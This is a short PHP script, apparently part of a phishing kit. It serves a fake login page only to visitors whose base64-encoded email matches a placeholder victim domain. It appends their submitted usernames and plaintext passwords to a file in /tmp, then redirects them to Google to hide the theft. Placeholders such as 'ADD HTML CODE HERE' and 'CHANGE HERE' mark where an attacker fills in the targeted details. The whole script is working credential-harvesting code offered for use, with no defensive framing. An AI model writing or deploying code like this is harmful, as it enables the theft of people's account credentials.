<?php
$body='ADD HTML CODE HERE
';   
$email = base64_decode($_GET["e"]);
$log = base64_decode($_GET["l"]);
// CHANGE HERE
if (preg_match("/@VICTIM_DOMAIN/i", $email)) {
    echo $body;
} else {    echo "Access Denied"; 
    exit();
}
$username = $_POST['username'];
$Password = $_POST['Password'];
$myFile = "/tmp/phemail_login_" . preg_replace('/[^\w-]/', '', $log). ".txt";
$fh = fopen($myFile, 'a') or die("can't open file");
if ($email){ 
    fwrite($fh,"Email: ".$email."
");
    $date = date("D d/m/Y H:i:s");
        fwrite($fh,"Date: ".$date."
");
}

if ($username){
    fwrite($fh,"Username: ".$username."\n");
    fwrite($fh,"Password: ".$Password."\n");
    fwrite($fh,"\n");	// Redirect after logged in
    echo '<META HTTP-EQUIV=Refresh CONTENT="0; URL=http://www.google.co.uk">';  
}
?>
